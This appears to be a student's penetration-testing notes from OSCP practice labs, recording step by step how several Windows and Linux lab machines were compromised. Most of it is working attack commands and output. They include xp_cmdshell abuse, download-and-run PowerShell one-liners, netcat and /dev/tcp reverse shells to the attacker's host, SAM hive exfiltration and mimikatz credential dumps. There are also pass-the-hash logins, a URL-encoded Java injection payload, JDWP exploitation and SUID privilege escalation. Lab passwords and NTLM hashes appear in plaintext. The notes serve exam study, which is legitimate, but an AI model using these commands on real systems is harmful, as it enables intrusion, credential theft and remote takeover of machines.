impacket-GetUserSPNs -dc-ip 10.10.153.146 oscp.exam/web_svc:Diamond1 -request
john -w=/home/kali/HTB/OSCP/rockyou.txt sql_svc147.hash (sql_svc:Dolphin1)

#Lateral Movement
crackmapexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -x "whoami"
MSSQL       10.10.125.148   1433   MS02             [+] oscp.exam\sql_svc:Dolphin1 (Pwn3d!)
MSSQL       10.10.125.148   1433   MS02             nt service\mssql$sqlexpress

crackmapexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -x 'certutil -urlcache -f http://192.168.45.220/rev1234.exe C:\Windows\Temp\rev1234.exe' # Access Denied
crackmapexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -x "certutil -urlcache -f http://192.168.45.220/rev1234.exe C:/Windows/Temp/rev1234.exe"  # None

netexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -x ipconfig
netexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -q 'SELECT name FROM master.dbo.sysdatabases;'    #master, tempdb, model, msdb
netexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -q 'SELECT name, password_hash FROM master.sys.sql_logins;'
MSSQL       10.10.125.148   1433   MS02             name:sa
MSSQL       10.10.125.148   1433   MS02             password_hash:b'0200bb05745ecc4aa4c3f07811d805a3bb895e68fd68df9cb25e8baf0f3b4fb736957f686de4e57fc3fb836e681efc4ac53641e8736227dae626fbb04b74f4323078d7b22c4b'
MSSQL       10.10.125.148   1433   MS02             name:##MS_PolicyEventProcessingLogin##
MSSQL       10.10.125.148   1433   MS02             password_hash:b'0200cc545e5f2603ca26d2b47d6ff480ae995e691e03e7602298ab35bcaf1b610905d9eb6037966508a38a4f690ece1fdf35e6687e3ebd7647fecd77309f0dbf73439bfcaff6'
MSSQL       10.10.125.148   1433   MS02             name:##MS_PolicyTsqlExecutionLogin##
MSSQL       10.10.125.148   1433   MS02             password_hash:b'0200eee47937685015f4a19498e211a40c6444edc9ac8e5ca8080c0d615cb069f10655918ae144fbe2fb000135d7191e32e783636e31b103488cf5b513f7bde718f742f770e5'

netexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -q 'select  loginname from syslogins where sysadmin = 1;' 
MSSQL       10.10.125.148   1433   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam)
MSSQL       10.10.125.148   1433   MS02             [+] oscp.exam\sql_svc:Dolphin1 (Pwn3d!)
MSSQL       10.10.125.148   1433   MS02             loginname:sa
MSSQL       10.10.125.148   1433   MS02             loginname:MS02\Administrator
MSSQL       10.10.125.148   1433   MS02             loginname:OSCP\sql_svc
MSSQL       10.10.125.148   1433   MS02             loginname:NT SERVICE\SQLWriter
MSSQL       10.10.125.148   1433   MS02             loginname:NT SERVICE\Winmgmt
MSSQL       10.10.125.148   1433   MS02             loginname:NT Service\MSSQL$SQLEXPRESS

crackmapexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -q "EXEC xp_cmdshell 'whoami'"

impacket-mssqlclient sql_svc:Dolphin1@10.10.125.148 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
#Now we can run commands
EXECUTE xp_cmdshell 'whoami';

#After successfully partial command shell observe the commands with syntax both are same caution EXECUTE
EXECUTE xp_cmdshell 'whoami';
xp_cmdshell powershell -c ls;
Not able to upload shell

.\nc.exe 10.10.125.148 1122 > sam
xp_cmdshell powershell -c Get-Content sam | .\C:/Users/Public/nc.exe 10.10.125.147 1122
xp_cmdshell powershell -c .\C:/Users/Public/nc.exe 10.10.125.147 1122 < sam

#After successfully partial command shell observe the commands with syntax both are same caution EXECUTE
EXECUTE xp_cmdshell 'whoami';
xp_cmdshell powershell -c ls;

Copy-Item -Path C:\windows.old\Windows\system32\sam -Destination C:/Users/Public
xp_cmdshell powershell -c Copy-Item -Path C:\windows.old\Windows\system32\sam -Destination C:/Users/Public;
xp_cmdshell powershell -c Copy-Item -Path C:\windows.old\Windows\system32\system -Destination C:/Users/Public;

$client = New-Object System.Net.Sockets.TcpClient("10.10.125.147", 1122) 
$stream = $client.GetStream() 
[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:/Users/Public/sam")  
$stream.Write($buffer, 0, $buffer.Length) 
$stream.Close() 
$client.Close()

nc -lvp 1234 > sam 

xp_cmdshell powershell -c ls C:/Users/Public

‘;EXEC xp_cmdshell ’powershell -c “IEX(New-Object System.Net.WebClient).DownloadString(”http://192.168.45.161/powercat.ps1;powercat -c 192.168.45.161 -p 4444 -e cmd;--

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.161/powercat.ps1');powercat -c 192.168.45.161 -p 4444 -e cmd"

ssh user@192.168.x.147 -D9090 -R :7777:localhost:7777 -R:8888:localhost:8888 
xp_cmdshell powershell -c iwr -uri http://192.168.45.161/PrintSpoofer64.exe -Outfile PrintSpoofer.exe

ssh user@192.168.193.147 -D9090 -R :7777:localhost:7777 -R:8888:localhost:8888 

Downloading file 7777
python3 -m http.server 7777
xp_cmdshell powershell -c iwr -uri http://10.10.153.147:7777/nc.exe -Outfile C:\Users\Public\nc.exe

Reverse shell used port 8888
xp_cmdshell powershell -c C:\Users\Public\nc.exe 10.10.153.147 8888 -e cmd
 rlwrap nc -nlvp 8888
 #Got shell

iwr -uri http://10.10.153.147:7777/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe

reg save hklm\sam c:\sam
reg save hklm\system c:\system

Internal machine 148---------------------
PS C:\Users\Public> Get-Content C:\sam | .\nc.exe 10.10.153.147 8888
Get-Content C:\sam | .\nc.exe 10.10.153.147 8888
PS C:\Users\Public> Get-Content C:\system | .\nc.exe 10.10.153.147 8888
Get-Content C:\system | .\nc.exe 10.10.153.147 8888

Kali Machine-------------------------
nc -lvp 8888 > system
listening on [any] 8888 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 50452

Another impacket-mssqlclientFinally downloaded in impacket-mssqlclient
xp_cmdshell powershell -c iwr -uri http://10.10.153.147:7777/mimicatz.exe -Outfile C:\Users\Public\mimicatz.exe;

.\mimicatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
* Username : Administrator
         * Domain   : OSCP
         * NTLM     : 59b280ba707d22e3ef0aa587fc29ffe5
         
         
         
evil-winrm -i 10.10.153.146 -u Administrator -H 59b280ba707d22e3ef0aa587fc29ffe5
#Got Admin shell

```

### OSCPB - SNMP and git - Linux

```jsx
By observing the Nmap result 3 ports are open
Nmap
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Try gobuster with port 80
gobuster dir -u http://192.168.217.149/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
gobuster dir -u http://192.168.217.149/ -w /usr/share/wordlists/dirb/big.txt       

Tried  FTP port 21 vsftpd 3.0.3 with searchsploit exploits
Tried SSH port 22 with OPENSSH 8.2p1 with searchsploit exploits

Nothing worked checked hints SNMP UDP Username Enumeration
snmp-check 192.168.171.149
>sudo nmap -A 192.168.171.149 -sU -p 160,161   
snmp       SNMPv1 server; net-snmp SNMPv3 server (public)

snmpwalk -c public -v1 192.168.171.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendCommand."RESET" = STRING: ./home/john/RESET_PASSWD
NET-SNMP-EXTEND-MIB::nsExtendArgs."RESET" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."RESET" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."RESET" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."RESET" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."RESET" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."RESET" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."RESET" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."RESET" = STRING: Resetting password of kiero to the default value
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."RESET" = STRING: Resetting password of kiero to the default value
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."RESET" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."RESET" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."RESET".1 = STRING: Resetting password of kiero to the default value

ssh kiero@192.168.171.149 (# kiero, john, password)
ssh john@192.168.171.149 (# kiero, john, password)
hydra -L 149_users.txt -P /home/kali/HTB/OSCP/rockyou.txt 192.168.171.149 ssh (# kiero, john users text file)
Hint Mentioned Don't thing to much like admin:admin in different service

ftp 192.168.171.149 (#kiero)
Found 3 id_rsa keys

#Got local Flag

Privilege Escalation
Executing Linux Exploit Suggester
https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops                                                                                                                                                                              

   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
   Exposure: probable
   Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
   Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-0847] DirtyPipe
>./ sh compile.sh
> sh compile.sh /usr/bin/sudo
> ./compile.sh /usr/bin/sudo

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

gcc --version
./ sh compile.sh # No luck
sh compile.sh /usr/bin/sudo
./compile.sh /usr/bin/sudo
# Downloaded exploit-2.c from above Github repository
gcc -o exploit-2 exploit-2.c
./exploit-2 /usr/bin/sudo
# Got root shell
```

### OSCPB -  8021 TCP FreeSWITCH - Windows

```jsx
192.168.206.151

NMAP PORT
80/tcp       open  http                					Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server         Microsoft Terminal Services
8021/tcp open  freeswitch-event     FreeSWITCH mod_event_socket

Port 8021 is the default TCP port that FreeSWITCH uses to listen for and execuete system commands via the event socket interface.
FreeSWITCH is a free, open-source software stack that enables real-time communication, video, and Voice over Internet Protocol (VoIP)

Serched in the searchsploit and then https://viperone.gitbook.io/pentest-everything/writeups/tryhackme/windows/flatline
python3 47799_exploit.py 192.168.206.151 'whoami'  
python3 47799_exploit.py 192.168.206.151 'type C:\Users\chris\Desktop\local.txt'
python3 47799_exploit.py 192.168.206.151  'net user /add ashok Password@123! && net localgroup "Administrators" /add ashok' error
python3 47799_exploit.py 192.168.206.151 ‘certutil.exe -urlcache -f http://192.168.45.220/nc.exe C:\Users\chris\Desktop\nc.exe’
python3 47799_exploit.py 192.168.206.151 'dir  C:\Users\chris\Desktop\'
#Netcat was downloaded
python3 47799_exploit.py 192.168.206.151 'C:\Users\chris\Desktop\nc.exe 192.168.45.220 1234 -e powershell.exe'
rlwrap nc -nlvp 1234
#Got Local Shell 

whoami /priv                                                                                                                                                                                                                                                                                                                                                                                                                              
Privilege Name             												   Description                              				 State                                                                                                                                                               
================== ================================ ===============                                                                                                                                                         
SeImpersonatePrivilege        Impersonate a client after authentication 					Enabled   

iwr -uri http://192.168.45.220/DeadPotato-NET4.exe -Outfile DeadPotato.exe
.\DeadPotato.exe -cmd whoami
#nt authority
 .\DeadPotato.exe -newadmin ashok:Ashok@123!
 #The command completed successfully. 
net localgroup adminisrators
#ashok user in the admin group

>xfreerdp /u:ashok /p:'Ashok@123!' /v:192.168.206.151 /smart-sizing:1920x1080 /cert-ignore  +clipboard
GOT root

```

### OSCPB - http-proxy Spring Java Framework, jdwp-shellifier.py- Linux

```jsx
192.168.206.150

NMAP 
22/tcp        open  ssh        OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy

Tried this link CVE-2022-42889

#Google Search exploit http-proxy Spring Java Framework https://www.exploit-db.com/exploits/50799

python3 50799.py http://192.168.206.150:8080 whoami
python3 50799.py http://192.168.206.150:8080 id
python3 50799.py http://192.168.206.150:8080 'id'   #Error no luch

Tried this based CVE exploit https://github.com/crowsec-edtech/CVE-2022-22947.git
[X] Error: Fail to deploy stage (Patched ?)

http://192.168.206.150:8080/search
#{"query":"*","result":""}
http://192.168.206.150:8080/search?query=whoami
{"query":"whoami","result":""}  # So query command is parameter is working

${script:javascript:java.lang.Runtime.getRuntime()exec(‘’)}
http://192.168.206.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29exec%28%E2%80%98whoami%E2%80%99%29%7D
#{"query":"${script:javascript:java.lang.Runtime.getRuntime()exec(‘whoami’)}","result":""}

${script:javascript:java.lang.Runtime.getRuntime()exec(‘nc 192.168.45.220 1234 -e /bin/bash’)}          #URL Encode
curl 'http://192.168.224.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29exec%28%E2%80%98nc%20192.168.45.220%201234%20-e%20%2Fbin%2Fbash%E2%80%99%29%7D'

Try shell 
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f elf > linux1234.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f sh > linux1234.sh

Question-OSCPB 150, for initial foothold, http://192.168.206.150:8080/search?query=whoami output will not printing {"query":"whoami","result":""} just printing the parameter we are searching, how we can proced with rev shell ? any help
HInt - https://discord.com/channels/780824470113615893/1087927556604432424/1255218982634651793
                                              
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f elf > linux1234.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f sh > linux1234.sh
# These shells are downloaded from the python server but no shell, The IP Address kali IP Address

# After Searching in the Medium link and Discord found this way to create shell
echo "bash -i >& /dev/tcp/192.168.45.220/443 0>&1" > shell
# In Browser
http://192.168.224.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27wget%20192.168.45.220%2Fshell%20-O%20%2Ftmp%2Fshell%27)%7D
http://192.168.224.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27bash%20%2Ftmp%2Fshell%27)%7D
rlwrap nc -nlvp 443
#Got shell

#Run the LinPEAS Transfored using

Run first Kali > nc -lvp 1234 > 150_linpeas.txt
Target >   nc <target_ip> 1234 < 150_linpeas.txt

Executing Linux Exploit Suggester
https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)                                                                                                                                                                                        

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: probable
   Tags: [ ubuntu=(22.04) ]{kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-0847] DirtyPipe - No Shell

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE No Shell

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
   
   
Processes, Crons, Timers, Services and Sockets   
root         854  0.0  1.7 2528964 34744 ?       Ssl  15:33   0:00 java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
   
   
    ssh ... -L 8000:127.0.0.1:8000
    
    
    git clone https://github.com/hugsy/jdwp-shellifier.git
python3 jdwp-shellifier.py -c "/bin/busybox nc 192.168.45.161 443 -e /bin/bash"

python3 jdwp-shellifier.py -t 192.168.45.161 -p 443    # Triggered but no shell
python3 jdwp-shellifier.py -c "/bin/busybox 192.168.45.161 443 -e /bin/bash"

--------------------------------Process
revert the machine once more and try it again.
forward the port with 

 ssh -i id_rsa dev@192.168.x.150 -L 8000:127.0.0.1:8000 
then try  python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "chmod u+s /bin/bash" 
you can also use nmap to confirm the forwarded port is open
on the target, (in the ssh session or whatever shell) run nc 127.0.0.1 5000
and you should see some activity in your exploit
this command should set the uid bit on the bash binary, so /bin/bash -p will give you a root shell
--------------------------------Process

ssh-keygen -t rsa -b 4096
After generating the SSH keys on the target machine using ssh-keygen, add the contents of the id_rsa.pub file to the authorized_keys file with cat id_rsa.pub > authorized_keys, and then log in using the private key.

ssh -i id_rsa150 dev@192.168.197.150 -L 8000:127.0.0.1:8000
check sudo nmap -p 8000 127.0.0.1

150>python3 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "chmod u+s /bin/bash"
>ll /bin/bash
>nc 127.0.0.1 5000 
CTRL+Z it don't session, it will close the nc session
>ll /bin/bash
>/bin/bash -p

Redone steps
Target .150 >nc 127.0.0.1 5000 -z
#Now SUID set 
>/bin/bash -p
>id 
euidis root
#ROOT SHELL

```

# OSCP C

## OSCPC AD 153

```jsx
192.168.179.153 -    - AD
Nmap
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http          Microsoft IIS httpd 10.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

SMB
smbmap -H 192.168.179.153 -u '' # 0 SMB Session
smbclient -L //192.168.179.153
smbclient -L ////192.168.179.153 -U ''
smbclient -L //192.168.179.153 -U '' -P ''
rpcclient 192.168.179.153
rpcclient -U="" 192.168.179.153
enum4linux 192.168.179.153 
enum4linux -a 192.168.179.153 

netexec smb 192.168.179.153 -u "" -p ""      #Access Denied

HTTP
gobuster dir -u http://192.168.179.153:8000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
http://192.168.179.153:8000/partner/ #403
http://oscp.exam:8000/aspnet_client/ #403
http://oscp.exam:8000/aspnet_client/system_web/ #403

feroxbuster --url http://oscp.exam:8000/ --insecure --filter-status 404 
http://oscp.exam:8000/partner/CHANGELOG #200
http://oscp.exam:8000/partner/Db #200

In the DB has the sqllitebrowser identified usernames and password, The SQLITEBROWSER GUI opened 
cat users.txt 
ecorp
support
bcorp
acorp

cat pass.txt        
Freedom1
ecorp

ssh support@192.168.157.153  (#Freedom1)
#GOT INTIAL SHELL
whoami /priv                                                                    
Privilege Name                Description                          State  
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled

PRIV ESC
iwr -uri http://192.168.45.161/winPEASx64.exe -Outfile winPEAS.exe 
.\winPEAS.exe > 153winPEAS.txt
iwr -uri http://192.168.45.161/nc.exe -Outfile nc.exe  

nc -lvp 1122 > 153winPEAS.txt 
Get-Content .\153winPEAS.txt | .\nc.exe 192.168.45.161 1122
SharpHound.exe is not compatable 
Import-module ./SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
Both SharpHound.exe, SharpHound.ps1 Unable to connect to LDAP, verify your credentials no output is generated

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue # Nothing

winPEAS
Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\Users\support\winPEAS.exe": support [AllAccess]
     File Permissions "C:\Users\support\admintool.exe": support [AllAccess]

support@MS01 C:\Users\support>admintool.exe whoami
Enter administrator password:

thread 'main' panicked at 'assertion failed: `(left == right)`
  left: `"d41d8cd98f00b204e9800998ecf8427e"`,
 right: `"05f8ba9f047f799adbea95a16de2ef5d"`: Wrong administrator password!', src/main.rs:78:5
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace

 d41d8cd98f00b204e9800998ecf8427e - Nothing
 05f8ba9f047f799adbea95a16de2ef5d- December31

evil-winrm -i 192.168.157.153 -u Administrator -p December31
#Got shell ms01 amdin

Poviting with Ligolo-NG
10.10.117.154
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Saving Creds from the sam and system, from the Mimicatz nothing found
reg save hklm\sam c:\sam
reg save hklm\sam c:\system
Get-Content C:\sam | .\nc.exe 192.168.45.161 1122
nc -lvp 1122 > sam  

impacket-secretsdump -system system -sam sam local 
[-] Can't find root key!
[-] 'NoneType' object is not subscriptable
[*] Cleaning up... 

#HInt
type C:\Users\Administrator\appdata\roaming\microsoft\windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\users\support\admintool.exe hghgib6vHT3bVWf cmd

nxc smb 10.10.117.154 -d oscp.exam -u users.txt -p pass.txt --continue-on-success
nxc winrm 10.10.117.154 -d oscp.exam -u users.txt -p pass.txt --continue-on-success
nxc winrm 10.10.117.154 -u users.txt -p pass.txt --continue-on-success --local-auth
#WINRM       10.10.117.154   5985   MS02             [+] MS02\administrator:hghgib6vHT3bVWf (Pwn3d!)

evil-winrm -i 10.10.117.154 -u administrator -p hghgib6vHT3bVWf   
#Got Admin shell 154

upload mimicatz.exe
 .\mimicatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
  * Username    : Administrator
         * Domain   : OSCP
         * NTLM       : 59b280ba707d22e3ef0aa587fc29ffe5
         
         
evil-winrm -i 10.10.117.152 -u administrator -H 59b280ba707d22e3ef0aa587fc29ffe5
#Got 152 proof.txt

```

## OSCPC 1- FTP file metadata, Vesta - Linux 156

```jsx
192.168.221.156 - FTP file metadata, Vesta 

OSCPC - Vesta Control Panel,Oneliner - Linux

Nmap
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp     Exim smtpd 4.90_1
53/tcp   open  domain   ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
80/tcp   open  http     nginx
|_http-title: oscp.exam &mdash; Coming Soon
110/tcp  open  pop3     Dovecot pop3d\
143/tcp  open  imap     Dovecot imapd (Ubuntu)\
465/tcp  open  ssl/smtp Exim smtpd 4.90_1
587/tcp  open  smtp     Exim smtpd 4.90_1
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp  open  ssl/pop3 Dovecot pop3d
2525/tcp open  smtp     Exim smtpd 4.90_1
3306/tcp open  mysql    MySQL 5.7.40-0ubuntu0.18.04.1
8080/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
8083/tcp open  http     nginx
|_http-title: Did not follow redirect to https://192.168.229.156:8083/
8443/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)

Using SSL certificate identified 
admin@oscp.example.com, some .pem file, nothing move forward

mysql -h 192.168.221.156 -u admin, then try -p as well
ERROR 1045 (28000): Access denied for user 'admin'@'192.168.45.220' (using password: NO)

Using nikto found that 
nikto -h http://oscp.exam/
http://oscp.exam/phpmyadmin/index.php
http://oscp.exam/phpmyadmin/changelog.php

#Hint Last night i saw that SNMP port is open
snmpwalk -c public -v1 192.168.221.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
Creds - jack:3PUKsX98BMupBiCf 

#Logged in with https://oscp.exam:8083/list/user/
Vesta using Jack creds - jack@oscp.exam

In this link https://ssd-disclosure.com/ssd-advisory-vestacp-multiple-vulnerabilities/, copied last 3 codes saved all 3 codes into the same folder
python3 vestaROOT.py https://192.168.221.156:8083 Jack 3PUKsX98BMupBiCf
#Got ROOT Shell

But this shell not interactive
sh -i >& /dev/tcp/192.168.45.220/4455 0>&1 
rlwrap nc -nlvp 4455
#GOT INTERACTIVE ROOT SHELL

```

## OSCPC 2 - Usermin, wildcard, tar  - Linux 157

```jsx
OSCPC - Usermin, wildcard, tar - Linux
Nmap
21/tcp    open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu))
